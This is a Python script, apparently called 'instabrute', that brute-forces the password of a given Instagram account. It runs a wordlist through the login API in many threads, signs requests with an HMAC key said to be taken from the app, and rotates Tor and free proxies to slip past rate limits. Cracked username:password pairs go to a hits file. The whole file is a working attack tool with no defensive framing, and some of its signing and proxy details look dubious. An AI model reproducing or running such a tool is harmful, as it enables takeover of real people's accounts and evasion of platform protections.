#!/usr/bin/env python3
import argparse
import json
import hashlib
import hmac
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import socks
import socket
from queue import Queue

# Config
with open('config/instabrute_config.json', 'r') as f:
    CONFIG = json.load(f)
THREADS = CONFIG['threads']
DELAY = CONFIG['delay']
TOR_PORTS = CONFIG['tor_ports']
LOGIN_URL = "https://i.instagram.com/api/v1/accounts/login/"
UA = "Instagram 350.0.0.21.114 Android (34/14; 560dpi; 1440x3120; samsung; SM-S928B; dm3q; exynos5400; en_US; 350000000000000)"
APP_ID = "567067343352427"
SIG_KEY = "686a36310a594a8f4a2f3c1d5b4b5a5e"  # HMAC key (from APK)

# Global
found = False
lock = threading.Lock()
resume_line = 0

def get_proxies():
    proxies = []
    for port in TOR_PORTS:
        proxies.append(f"socks5://127.0.0.1:{port}")
    # Add free proxies from file (sorted/tested)
    with open('proxies/free_proxies.txt', 'r') as f:
        for line in f:
            line = line.strip()
            if line:
                proxies.append(f"socks5://{line}")
    random.shuffle(proxies)  # Rotate
    return proxies[:200]  # Limit

def sort_proxies(proxies):
    working = []
    def test_proxy(p):
        try:
            socks.set_default_proxy(socks.SOCKS5, p.split('://')[1].split(':')[0], int(p.split(':')[-1]))
            socket.socket().connect(('google.com', 80))
            return p
        except:
            return None
    with ThreadPoolExecutor(max_workers=50) as exec:
        working = [p for p in exec.map(test_proxy, proxies) if p]
    with open('proxies/working_proxies.txt', 'w') as f:
        f.write('\n'.join(working))
    return working

def get_csrf(proxy=None):
    session = requests.Session()
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    retry = Retry(total=3, backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.headers = {'User-Agent': UA}
    resp = session.get("https://www.instagram.com/accounts/login/")
    csrf = resp.cookies.get('csrftoken', '')
    session.close()
    return csrf

def sign_payload(payload):
    body = json.dumps(payload, separators=(',', ':'))
    sig = hmac.new(SIG_KEY.encode(), body.encode(), hashlib.sha256).hexdigest()
    return f"ig_sig_key_version=4&signed_body={sig}.{body}"

def try_password(username, password, proxy, csrf):
    global found
    session = requests.Session()
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    session.headers = {
        'User-Agent': UA,
        'X-IG-App-ID': APP_ID,
        'X-CSRFToken': csrf,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
    }
    timestamp = str(int(time.time()))
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }
    signed = sign_payload(payload)
    try:
        resp = session.post(LOGIN_URL, data=signed, timeout=10)
        time.sleep(DELAY + random.uniform(0, 0.5))  # Random delay + backoff
        if '"authenticated":true' in resp.text:
            with lock:
                print(f"[+] CRACKED! {username}:{password}")
                with open('hits/cracked.txt', 'a') as f:
                    f.write(f"{username}:{password}\n")
                found = True
                return True
        elif 'checkpoint_required' in resp.text:
            print(f"[!] Checkpoint on {password} - Manual verify?")
        elif '"spam":true' in resp.text:
            print(f"[!] Rate limit - Rotate proxy")
            return False
        else:
            print(f"[-] Fail: {password[:10]}...")
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    finally:
        session.close()

def worker(queue, username, proxies, csrf):
    while not queue.empty() and not found:
        pw = queue.get()
        proxy = random.choice(proxies)
        try_password(username, pw, proxy, csrf)
        queue.task_done()

def main():
    global resume_line
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', required=True, help='Username')
    parser.add_argument('-w', default='wordlists/rockyou_sample.txt', help='Wordlist')
    parser.add_argument('-t', type=int, default=THREADS, help='Threads')
    parser.add_argument('-r', action='store_true', help='Resume')
    parser.add_argument('-p', default='proxies/working_proxies.txt', help='Proxies')
    parser.add_argument('-d', type=float, default=DELAY, help='Delay (s)')
    args = parser.parse_args()

    # Validate user
    import subprocess
    subprocess.run(['python', 'validate_user.py', args.u])

    # Load wordlist
    with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
        words = [line.strip() for line in f if line.strip()]
    if args.r:
        resume_line = int(input("Resume from line: ")) or 0
        words = words[resume_line:]

    # Proxies
    with open(args.p, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    if not proxies:
        proxies = get_proxies()
        proxies = sort_proxies(proxies)
    print(f"[+] Loaded {len(words)} pw, {len(proxies)} proxies, {args.t} threads")

    # CSRF (fetch fresh)
    csrf = get_csrf(random.choice(proxies))
    if not csrf:
        print("[-] Failed CSRF - Retry")
        return

    queue = Queue()
    for word in words:
        queue.put(word)

    with ThreadPoolExecutor(max_workers=args.t) as exec:
        futures = [exec.submit(worker, queue, args.u, proxies, csrf) for _ in range(args.t)]
        for future in futures:
            future.result()

    print("[+] Done! Check hits/cracked.txt")

if __name__ == "__main__":
    main()